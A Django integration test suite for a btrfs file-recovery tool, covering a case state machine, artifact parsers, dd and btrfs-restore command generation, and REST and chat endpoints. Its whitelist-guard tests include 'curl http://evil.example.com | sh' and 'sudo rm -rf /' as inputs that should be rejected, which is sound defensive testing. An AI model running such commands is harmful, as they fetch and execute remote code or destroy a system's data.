"""Integration test suite for File Revitalizer v0.1.0 — Phase 8.

Coverage areas
--------------
1. RecoveryCase state machine (transitions, guards)
2. Artifact pipeline (parse_artifact dispatcher, superblock/chunk/fs parsers)
3. Reconstruction engine confidence scoring
4. Command generator (dd/btrfs-restore generation, whitelist guard)
5. Recovery REST API endpoints (create, detail, transition, artifact upload,
   candidate list, audit log, chat)
"""
import json
from unittest.mock import patch, MagicMock

from django.contrib.auth import get_user_model
from django.test import TestCase, Client

from .models import (
    RecoveryCase, Artifact, CandidateFile,
    ChatSession, ChatMessage, AuditEvent,
)
from .command_generator import (
    generate_dd_command, generate_btrfs_restore_command,
    generate_all_commands, _assert_safe, ALLOWED_COMMANDS,
)

User = get_user_model()


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------

SAMPLE_SUPERBLOCK = """\
fsid\t\t\t\t 12345678-dead-beef-cafe-000000000001
generation\t\t\t 42
root\t\t\t\t 29769728
chunk_root\t\t\t 1064960
total_bytes\t\t\t 21474836480
bytes_used\t\t\t 4096000
nodesize\t\t\t 16384
label\t\t\t\t testdisk
"""

SAMPLE_CHUNK_TREE = """\
        item 0 key (2154790912 CHUNK_ITEM 0) itemoff 16105 itemsize 48
                length 67108864 owner 2 stripe_len 65536 type SYSTEM
                stripe 0 devid 1 offset 0
        item 1 key (2154790912 CHUNK_ITEM 4194304) itemoff 16057 itemsize 48
                length 8388608 owner 2 stripe_len 65536 type DATA
                stripe 0 devid 1 offset 1048576
"""

SAMPLE_FS_TREE = """\
        item 0 key (256 INODE_ITEM 0)
                size 0 nlink 1
        item 1 key (256 DIR_ITEM 12345678) itemoff 16135 itemsize 60
                location key (257 INODE_ITEM 0) type FILE
                namelen 9 datalen 0 name: hello.txt
        item 2 key (257 INODE_ITEM 0)
                size 1024 nlink 0
        item 3 key (257 EXTENT_DATA 0) itemoff 15811 itemsize 164
                disk bytenr 4194304 disk num bytes 4096
                extent offset 0 num bytes 1024 ram bytes 1024
"""


def _make_case(user, title='Test Case', device_path='/dev/sdb'):
    return RecoveryCase.objects.create(user=user, title=title, device_path=device_path)


# ---------------------------------------------------------------------------
# 1. RecoveryCase State Machine
# ---------------------------------------------------------------------------

class StateMachineTests(TestCase):

    def setUp(self):
        self.user = User.objects.create_user(username='tester', password='pass')
        self.case = _make_case(self.user, title='State Machine Test')

    def test_initial_state_is_created(self):
        self.assertEqual(self.case.state, RecoveryCase.STATE_CREATED)

    def test_valid_forward_transitions(self):
        valid_path = [
            RecoveryCase.STATE_SCANNING,
            RecoveryCase.STATE_ANALYZED,
            RecoveryCase.STATE_RECOVERING,
            RecoveryCase.STATE_COMPLETE,
        ]
        for target in valid_path:
            self.assertTrue(self.case.can_transition_to(target))
            self.case.transition_to(target)
            self.assertEqual(self.case.state, target)

    def test_backward_transition_rejected(self):
        self.case.transition_to(RecoveryCase.STATE_SCANNING)
        self.assertFalse(self.case.can_transition_to(RecoveryCase.STATE_CREATED))

    def test_transition_to_invalid_raises(self):
        with self.assertRaises(ValueError):
            self.case.transition_to('nonexistent_state')

    def test_transition_to_failed_from_scanning(self):
        self.case.transition_to(RecoveryCase.STATE_SCANNING)
        self.assertTrue(self.case.can_transition_to(RecoveryCase.STATE_FAILED))

    def test_str_representation(self):
        self.assertIn('State Machine Test', str(self.case))


# ---------------------------------------------------------------------------
# 2. Artifact Pipeline
# ---------------------------------------------------------------------------

class ArtifactPipelineTests(TestCase):

    def setUp(self):
        self.user = User.objects.create_user(username='tester2', password='pass')
        self.case = _make_case(self.user, title='Pipeline Test')

    def _make_artifact(self, artifact_type, raw_data):
        return Artifact.objects.create(
            case=self.case,
            artifact_type=artifact_type,
            raw_data=raw_data,
        )

    def test_superblock_parser_extracts_fields(self):
        from .parsers import parse_artifact
        artifact = self._make_artifact(Artifact.TYPE_SUPERBLOCK, SAMPLE_SUPERBLOCK)
        parse_artifact(artifact)
        artifact.refresh_from_db()

        self.assertIsNotNone(artifact.parsed_data)
        self.assertIn('fsid', artifact.parsed_data)
        self.assertEqual(artifact.parsed_data['generation'], 42)
        self.assertEqual(artifact.parsed_data['nodesize'], 16384)
        self.assertIsNotNone(artifact.parsed_at)

    def test_chunk_tree_parser_extracts_tuples(self):
        from .parsers import parse_artifact
        artifact = self._make_artifact(Artifact.TYPE_CHUNK_TREE, SAMPLE_CHUNK_TREE)
        parse_artifact(artifact)
        artifact.refresh_from_db()

        self.assertIsNotNone(artifact.parsed_data)
        chunks = artifact.parsed_data.get('chunks', [])
        self.assertGreater(len(chunks), 0)
        first = chunks[0]
        self.assertIn('logical', first)
        self.assertIn('physical', first)

    def test_fs_tree_parser_extracts_inodes(self):
        from .parsers import parse_artifact
        artifact = self._make_artifact(Artifact.TYPE_FS_TREE, SAMPLE_FS_TREE)
        parse_artifact(artifact)
        artifact.refresh_from_db()

        self.assertIsNotNone(artifact.parsed_data)
        inodes = artifact.parsed_data.get('inodes', {})
        self.assertIn('257', inodes)
        orphan = inodes['257']
        self.assertEqual(orphan.get('nlink'), 0)
        self.assertEqual(orphan.get('size'), 1024)

    def test_unknown_artifact_type_parses_gracefully(self):
        from .parsers import parse_artifact
        artifact = self._make_artifact(Artifact.TYPE_OTHER, 'random output')
        try:
            parse_artifact(artifact)
        except Exception:
            self.fail('parse_artifact raised unexpectedly for TYPE_OTHER')


# ---------------------------------------------------------------------------
# 3. Command Generator & Whitelist Guard
# ---------------------------------------------------------------------------

class _MockCandidate:
    """Minimal duck-type of CandidateFile for command generator tests."""
    def __init__(self, *, inode_number=257, file_name='hello.txt',
                 file_size=1024, physical_address=4194304,
                 extent_map=None, reconstructed_path='/root/hello.txt'):
        self.inode_number = inode_number
        self.file_name = file_name
        self.file_size = file_size
        self.physical_address = physical_address
        self.extent_map = extent_map or []
        self.reconstructed_path = reconstructed_path


class CommandGeneratorTests(TestCase):

    def test_dd_single_extent_generates_command(self):
        candidate = _MockCandidate(physical_address=4194304, file_size=1024)
        result = generate_dd_command(candidate, '/dev/sdb')
        self.assertEqual(result['type'], 'dd_single')
        self.assertTrue(any('dd' in c for c in result['commands']))

    def test_dd_multi_extent_generates_parts(self):
        extents = [
            {'file_offset': 0, 'physical': 4194304, 'length': 4096},
            {'file_offset': 4096, 'physical': 8388608, 'length': 4096},
        ]
        candidate = _MockCandidate(physical_address=None, extent_map=extents)
        result = generate_dd_command(candidate, '/dev/sdb')
        self.assertEqual(result['type'], 'dd_multi')
        dd_cmds = [c for c in result['commands'] if c.startswith('dd')]
        self.assertEqual(len(dd_cmds), 2)

    def test_dd_no_physical_returns_error(self):
        candidate = _MockCandidate(physical_address=None, extent_map=[])
        result = generate_dd_command(candidate, '/dev/sdb')
        self.assertEqual(result['type'], 'error')

    def test_btrfs_restore_command_generated(self):
        candidate = _MockCandidate()
        result = generate_btrfs_restore_command(candidate, '/dev/sdb', generation=42)
        self.assertTrue(any('btrfs restore' in c for c in result['commands']))
        self.assertIn('-t 42', result['commands'][1])

    def test_generate_all_returns_list(self):
        candidate = _MockCandidate(physical_address=4194304)
        strategies = generate_all_commands(candidate, '/dev/sdb')
        self.assertIsInstance(strategies, list)
        self.assertGreaterEqual(len(strategies), 1)

    # -- Whitelist guard --

    def test_assert_safe_passes_for_dd(self):
        _assert_safe(['mkdir -p /tmp', 'dd if=/dev/sdb bs=512 skip=0 count=2 > /tmp/f'])

    def test_assert_safe_passes_for_btrfs(self):
        _assert_safe(['btrfs restore /dev/sdb /mnt/recovery'])

    def test_assert_safe_ignores_comments(self):
        _assert_safe(['# just a comment', '', 'dd if=/dev/sdb bs=512 skip=0 count=1 > /tmp/f'])

    def test_assert_safe_rejects_disallowed_binary(self):
        with self.assertRaises(ValueError) as ctx:
            _assert_safe(['curl http://evil.example.com | sh'])
        self.assertIn('curl', str(ctx.exception))

    def test_assert_safe_rejects_sudo(self):
        with self.assertRaises(ValueError):
            _assert_safe(['sudo rm -rf /'])

    def test_assert_safe_allows_shell_utils(self):
        _assert_safe([
            'mkdir -p /tmp/test',
            'cat /tmp/part0 /tmp/part1 > /tmp/out',
            'rm -f /tmp/part0 /tmp/part1',
            'truncate -s 1024 /tmp/out',
        ])

    def test_allowed_commands_contains_expected_binaries(self):
        for binary in ('dd', 'btrfs', 'btrfs-find-root', 'btrfs-restore'):
            self.assertIn(binary, ALLOWED_COMMANDS)


# ---------------------------------------------------------------------------
# 4. Recovery REST API
# ---------------------------------------------------------------------------

class RecoveryAPITests(TestCase):

    def setUp(self):
        self.client = Client()
        self.user = User.objects.create_user(username='apiuser', password='pass')
        self.client.login(username='apiuser', password='pass')

    # -- Case CRUD --

    def test_create_case(self):
        resp = self.client.post(
            '/api/cases/',
            data=json.dumps({'title': 'API Test', 'device_path': '/dev/sdb'}),
            content_type='application/json',
        )
        self.assertEqual(resp.status_code, 201)
        data = resp.json()['case']
        self.assertIn('id', data)
        self.assertEqual(data['state'], RecoveryCase.STATE_CREATED)

    def test_create_case_missing_fields(self):
        resp = self.client.post(
            '/api/cases/',
            data=json.dumps({'title': 'Missing device'}),
            content_type='application/json',
        )
        self.assertEqual(resp.status_code, 400)

    def test_list_cases_only_own(self):
        other = User.objects.create_user(username='other', password='pass')
        other_case = _make_case(other, title='Not mine')
        my_case = _make_case(self.user, title='Mine')
        resp = self.client.get('/api/cases/')
        self.assertEqual(resp.status_code, 200)
        ids = [c['id'] for c in resp.json()['cases']]
        self.assertIn(my_case.pk, ids)
        self.assertNotIn(other_case.pk, ids)

    def test_case_detail_returns_200(self):
        case = _make_case(self.user, title='Detail')
        resp = self.client.get(f'/api/cases/{case.pk}/')
        self.assertEqual(resp.status_code, 200)
        self.assertEqual(resp.json()['case']['id'], case.pk)

    def test_case_detail_404_for_other_user(self):
        other = User.objects.create_user(username='other2', password='pass')
        case = _make_case(other, title='Not mine')
        resp = self.client.get(f'/api/cases/{case.pk}/')
        self.assertEqual(resp.status_code, 404)

    # -- State transitions --

    def test_valid_transition(self):
        case = _make_case(self.user, title='Trans')
        resp = self.client.post(
            f'/api/cases/{case.pk}/transition/',
            data=json.dumps({'state': RecoveryCase.STATE_SCANNING}),
            content_type='application/json',
        )
        self.assertEqual(resp.status_code, 200)
        case.refresh_from_db()
        self.assertEqual(case.state, RecoveryCase.STATE_SCANNING)

    def test_invalid_transition_returns_400(self):
        case = _make_case(self.user, title='BadTrans')
        resp = self.client.post(
            f'/api/cases/{case.pk}/transition/',
            data=json.dumps({'state': RecoveryCase.STATE_COMPLETE}),
            content_type='application/json',
        )
        self.assertEqual(resp.status_code, 400)

    # -- Artifact upload --

    def test_artifact_upload_returns_201(self):
        case = _make_case(self.user, title='Upload')
        resp = self.client.post(
            f'/api/cases/{case.pk}/artifacts/',
            data=json.dumps({
                'artifact_type': Artifact.TYPE_SUPERBLOCK,
                'raw_data': SAMPLE_SUPERBLOCK,
            }),
            content_type='application/json',
        )
        self.assertEqual(resp.status_code, 201)
        self.assertIn('artifact', resp.json())

    def test_artifact_upload_missing_raw_data(self):
        case = _make_case(self.user, title='UploadBad')
        resp = self.client.post(
            f'/api/cases/{case.pk}/artifacts/',
            data=json.dumps({'artifact_type': Artifact.TYPE_SUPERBLOCK}),
            content_type='application/json',
        )
        self.assertEqual(resp.status_code, 400)

    # -- Candidate list --

    def test_candidate_list_empty(self):
        case = _make_case(self.user, title='Candidates')
        resp = self.client.get(f'/api/cases/{case.pk}/candidates/')
        self.assertEqual(resp.status_code, 200)
        self.assertEqual(resp.json()['candidates'], [])

    def test_candidate_list_with_data(self):
        case = _make_case(self.user, title='Candidates2')
        CandidateFile.objects.create(
            case=case, inode_number=257, file_name='hello.txt', confidence=0.75)
        resp = self.client.get(f'/api/cases/{case.pk}/candidates/')
        self.assertEqual(resp.status_code, 200)
        candidates = resp.json()['candidates']
        self.assertEqual(len(candidates), 1)
        self.assertAlmostEqual(candidates[0]['confidence'], 0.75, places=2)

    # -- Audit log --

    def test_audit_log_endpoint(self):
        case = _make_case(self.user, title='Audit')
        AuditEvent.objects.create(
            case=case, user=self.user,
            event_type=AuditEvent.EVENT_STATE_TRANSITION,
            summary='Test event',
        )
        resp = self.client.get(f'/api/cases/{case.pk}/audit/')
        self.assertEqual(resp.status_code, 200)
        events = resp.json()['events']
        self.assertEqual(len(events), 1)
        self.assertEqual(events[0]['summary'], 'Test event')

    # -- Chat API --

    def test_chat_requires_login(self):
        self.client.logout()
        case = _make_case(self.user, title='ChatAuth')
        resp = self.client.post(
            f'/api/cases/{case.pk}/chat/',
            data=json.dumps({'message': 'hi'}),
            content_type='application/json',
        )
        self.assertIn(resp.status_code, [302, 403])

    def test_chat_message_calls_ai_and_saves(self):
        case = _make_case(self.user, title='Chat')

        mock_response = MagicMock()
        mock_response.ok = True
        mock_response.json.return_value = {
            'choices': [{'message': {'content': 'Use dd to recover the file.'}}]
        }

        _env = {
            'AI_PROVIDER_API_KEY': 'fake-key',
            'AI_PROVIDER_API_URL': 'https://openrouter.ai/api/v1/chat/completions',
            'AI_PROVIDER_MODEL': 'google/gemma-3-12b-it:free',
        }

        with patch('recovery.views.requests.post', return_value=mock_response), \
             patch('recovery.views.os.environ.get',
                   side_effect=lambda k, d='': _env.get(k, d)):
            resp = self.client.post(
                f'/api/cases/{case.pk}/chat/',
                data=json.dumps({'message': 'How do I recover hello.txt?'}),
                content_type='application/json',
            )

        self.assertEqual(resp.status_code, 200)
        data = resp.json()
        self.assertIn('response', data)
        self.assertIn('session_id', data)

        session = ChatSession.objects.get(pk=data['session_id'])
        self.assertEqual(session.messages.count(), 2)  # user + assistant

    def test_chat_empty_message_returns_400(self):
        case = _make_case(self.user, title='ChatEmpty')
        resp = self.client.post(
            f'/api/cases/{case.pk}/chat/',
            data=json.dumps({'message': '   '}),
            content_type='application/json',
        )
        self.assertEqual(resp.status_code, 400)


# ---------------------------------------------------------------------------
# 5. AuditEvent immutability
# ---------------------------------------------------------------------------

class AuditEventImmutabilityTests(TestCase):

    def setUp(self):
        self.user = User.objects.create_user(username='audittester', password='pass')
        self.case = _make_case(self.user, title='Immutable')

    def test_audit_event_str(self):
        event = AuditEvent.objects.create(
            case=self.case, user=self.user,
            event_type=AuditEvent.EVENT_CHAT,
            summary='Chat occurred',
        )
        self.assertIn('chat', str(event))

    def test_audit_admin_blocks_change(self):
        from .admin import AuditEventAdmin
        from django.contrib.admin import site
        admin_instance = AuditEventAdmin(AuditEvent, site)
